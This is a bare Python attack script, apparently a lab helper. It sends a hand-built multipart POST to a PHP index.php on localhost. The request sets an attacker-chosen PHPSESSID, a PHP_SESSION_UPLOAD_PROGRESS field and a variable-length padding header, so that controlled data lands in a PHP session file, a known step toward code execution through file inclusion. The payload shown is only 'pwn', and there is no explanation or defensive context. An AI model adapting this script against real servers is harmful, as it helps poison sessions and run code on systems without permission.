#!/usr/bin/env python3
import socket, sys
N=int(sys.argv[1]) if len(sys.argv)>1 else 0
HOST='127.0.0.1'; PORT=8088; BND=b'B'*10
parts=[('PHPSESSID',b'attacksessionid0001',None),('PHP_SESSION_UPLOAD_PROGRESS',b'pwn',None),('f',b'Z'*64,('a.txt','text/plain'))]
o=bytearray()
for name,data,fn in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+name.encode()+b'"'
    if fn: o+=b'; filename="'+fn[0].encode()+b'"\r\nContent-Type: '+fn[1].encode()+b'\r\n\r\n'
    else: o+=b'\r\n\r\n'
    o+=data+b'\r\n'
o+=b'--'+BND+b'--\r\n'; body=bytes(o)
h=(f'POST /index.php HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nX-Pad: {"A"*N}\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection((HOST,PORT),timeout=20); s.settimeout(20); s.sendall(h+body)
try:
    while s.recv(65536): pass
except: pass
s.close()
